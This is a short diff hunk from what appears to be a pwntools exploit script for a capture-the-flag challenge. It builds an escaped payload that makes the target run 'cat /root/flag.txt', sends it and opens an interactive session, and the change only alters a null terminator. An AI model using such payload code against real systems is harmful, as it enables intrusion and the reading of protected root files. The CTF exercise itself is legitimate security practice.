@@ -48,7 +48,7 @@ for ch in bytes(frame):
     frame_escaped += bytes([0x16, ch])
 payload += frame_escaped
 payload += b'cat' + p32(0)
-payload += b'/root/flag.txt\x00\x00'
+payload += b'/root/flag.txt\0'
 io.send(payload+b'\x04')
 
 io.interactive()
